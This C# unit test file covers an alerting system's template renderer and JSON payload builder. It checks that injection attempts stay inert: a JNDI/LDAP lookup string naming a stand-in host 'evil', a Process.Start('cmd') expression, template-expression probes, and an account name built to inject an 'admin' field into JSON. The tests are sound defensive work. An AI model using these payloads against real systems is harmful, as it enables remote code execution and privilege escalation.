using System.Text.Json;
using System.Text.Json.Nodes;
using Sentinel.Application.Actions;

namespace Sentinel.Tests.Actions;

/// <summary>
/// Filling an alert's values into a message, and the reason structured payloads are never built this way.
/// </summary>
public class TemplateRendererTests
{
    private static ActionContext Context(params (string Key, string Value)[] eventFields) => new(
        AlertId: "a1b2c3",
        AlertRowId: 42,
        RuleId: 7,
        RuleVersion: 3,
        RuleName: "Brute Force Detection",
        Severity: "HIGH",
        DetectedAt: new DateTimeOffset(2026, 1, 15, 10, 5, 0, TimeSpan.Zero),
        Event: eventFields.Length == 0
            ? new Dictionary<string, string> { ["source.ip"] = "10.10.10.20", ["user.id"] = "alice" }
            : eventFields.ToDictionary(f => f.Key, f => f.Value),
        Evidence: new Dictionary<string, string> { ["eventCount"] = "31", ["window"] = "5m" },
        Settings: new Dictionary<string, string> { ["durationSeconds"] = "1800" });

    [Fact]
    public void Alert_rule_and_event_values_are_substituted()
    {
        var result = TemplateRenderer.Render(
            "Rule: {{rule.name}} / Severity: {{alert.severity}} / IP: {{event.source.ip}}", Context());

        Assert.Equal("Rule: Brute Force Detection / Severity: HIGH / IP: 10.10.10.20", result.Text);
        Assert.False(result.HadMissing);
    }

    [Fact]
    public void Evidence_and_per_action_settings_are_reachable()
    {
        var result = TemplateRenderer.Render(
            "{{evidence.eventCount}} events in {{evidence.window}}, blocking for {{setting.durationSeconds}}s",
            Context());

        Assert.Equal("31 events in 5m, blocking for 1800s", result.Text);
    }

    [Fact]
    public void Whitespace_inside_a_placeholder_is_tolerated() =>
        Assert.Equal("10.10.10.20", TemplateRenderer.Render("{{  event.source.ip  }}", Context()).Text);

    [Fact]
    public void A_missing_field_leaves_a_blank_rather_than_the_placeholder()
    {
        // An SMS reading "User: {{event.user.id}}" during an incident is worse than one reading "User:".
        var result = TemplateRenderer.Render("User: {{event.user.id}}", Context(("source.ip", "10.0.0.1")));

        Assert.Equal("User: ", result.Text);
        Assert.Contains("event.user.id", result.MissingPaths);
    }

    [Fact]
    public void A_missing_field_does_not_fail_the_action()
    {
        // An address still needs blocking whether or not the account behind it was identified.
        var result = TemplateRenderer.Render("{{event.nothing.here}}", Context());

        Assert.True(result.HadMissing);
        Assert.NotNull(result.Text);
    }

    // -- the things a template engine would have allowed --------------------------------------

    [Theory]
    [InlineData("{{ 7 * 7 }}")]
    [InlineData("{{#each items}}x{{/each}}")]
    [InlineData("{{ System.Diagnostics.Process.Start('cmd') }}")]
    [InlineData("${jndi:ldap://evil/x}")]
    [InlineData("<%= 7*7 %>")]
    public void Anything_that_is_not_a_plain_path_is_left_alone(string template)
    {
        // There is no expression evaluation to reach. A general-purpose engine here would be a scripting
        // surface inside the component that blocks addresses, reachable by anyone who can author a rule.
        var result = TemplateRenderer.Render(template, Context());

        Assert.DoesNotContain("49", result.Text, StringComparison.Ordinal);
    }

    [Fact]
    public void A_path_that_was_not_exposed_does_not_resolve()
    {
        // The vocabulary is enumerated in ActionContext; there is no object graph to walk into.
        var result = TemplateRenderer.Render("{{connection.apiKey}} {{settings.Secret}}", Context());

        Assert.True(result.HadMissing);
        Assert.Equal(" ", result.Text);
    }

    [Fact]
    public void A_message_is_bounded()
    {
        var result = TemplateRenderer.Render(new string('x', TemplateRenderer.MaxLength + 500), Context());

        Assert.Equal(TemplateRenderer.MaxLength, result.Text.Length);
    }

    // -- author-time checking ----------------------------------------------------------------

    [Fact]
    public void The_paths_a_template_uses_can_be_listed()
    {
        var paths = TemplateRenderer.PathsIn("{{rule.name}} {{event.source.ip}} {{rule.name}}");

        Assert.Equal(2, paths.Count);
    }

    [Fact]
    public void A_typo_is_caught_at_save_time()
    {
        // Otherwise an author discovers it in an SMS during an incident.
        var unknown = TemplateRenderer.UnknownPaths(
            "{{rule.nmae}} {{alert.severity}}",
            ["rule.name", "alert.severity", "event.source.ip"]);

        Assert.Equal(["rule.nmae"], unknown);
    }

    [Fact]
    public void Event_paths_are_not_rejected_because_they_depend_on_the_rule()
    {
        // Which event fields exist depends on the group-by and on the document, neither fully known when
        // the rule is saved.
        Assert.Empty(TemplateRenderer.UnknownPaths(
            "{{event.anything.at.all}}", ["rule.name", "event.source.ip"]));
    }
}

/// <summary>
/// Why a structured payload is assembled rather than templated.
///
/// The brief writes its payloads as templates inside JSON — <c>{ "userId": "{{event.user.id}}" }</c> — and
/// that is the bug. The value came out of a log line somebody else wrote, so it is attacker-influenced by
/// definition.
/// </summary>
public class JsonPayloadTests
{
    private static ActionContext WithUser(string userId) => new(
        "a1", 1, 7, 3, "Rule", "HIGH", DateTimeOffset.UtcNow,
        new Dictionary<string, string> { ["user.id"] = userId },
        new Dictionary<string, string>(),
        new Dictionary<string, string>());

    [Fact]
    public void A_value_containing_a_quote_stays_a_value()
    {
        // Templated into a JSON string this breaks the document.
        var payload = JsonPayload.Build(
            new Dictionary<string, string> { ["userId"] = "{{event.user.id}}" },
            WithUser("alice\"bob"),
            out _);

        var parsed = JsonNode.Parse(payload.ToJsonString())!;
        Assert.Equal("alice\"bob", parsed["userId"]!.GetValue<string>());
    }

    [Fact]
    public void A_value_cannot_add_a_field_to_the_request()
    {
        // The attack the brief's payload shape invites: an account name that closes the string and opens
        // another property.
        var payload = JsonPayload.Build(
            new Dictionary<string, string> { ["userId"] = "{{event.user.id}}", ["duration"] = "1800" },
            WithUser("""alice","admin":true,"x":"""),
            out _);

        var parsed = JsonNode.Parse(payload.ToJsonString())!.AsObject();

        Assert.Equal(2, parsed.Count);
        Assert.False(parsed.ContainsKey("admin"));
        Assert.Contains("admin", parsed["userId"]!.GetValue<string>(), StringComparison.Ordinal);
    }

    [Fact]
    public void Substitution_happens_per_value_never_across_the_document()
    {
        var payload = JsonPayload.Build(
            new Dictionary<string, string> { ["a"] = "{{event.user.id}}", ["b"] = "literal" },
            WithUser("}{"),
            out _);

        Assert.Equal("}{", payload["a"]!.GetValue<string>());
        Assert.Equal("literal", payload["b"]!.GetValue<string>());
    }

    [Fact]
    public void Missing_paths_are_reported_to_the_caller()
    {
        JsonPayload.Build(
            new Dictionary<string, string> { ["userId"] = "{{event.absent}}" },
            WithUser("alice"),
            out var missing);

        Assert.Equal(["event.absent"], missing);
    }

    [Fact]
    public void The_stored_summary_redacts_what_it_is_told_to()
    {
        // An execution record is read by more people than are entitled to the security team's numbers.
        var payload = new JsonObject
        {
            ["message"] = "Alert",
            ["recipients"] = new JsonArray("+989120000000")
        };

        var summary = JsonPayload.Summarize(payload, ["recipients"]);

        Assert.DoesNotContain("989120000000", summary, StringComparison.Ordinal);
        Assert.Contains("Alert", summary, StringComparison.Ordinal);
    }

    [Fact]
    public void The_stored_summary_is_bounded()
    {
        var payload = new JsonObject { ["blob"] = new string('x', 5_000) };

        Assert.True(JsonPayload.Summarize(payload, []).Length <= 2_000);
    }
}
